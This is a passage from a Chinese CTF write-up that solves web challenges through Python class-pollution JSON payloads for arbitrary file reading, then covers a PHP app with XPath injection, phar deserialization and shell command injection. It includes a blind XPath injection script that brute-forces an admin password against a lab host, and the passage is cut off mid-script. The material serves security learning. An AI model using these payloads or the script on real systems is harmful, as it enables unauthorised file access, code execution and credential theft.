<span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> 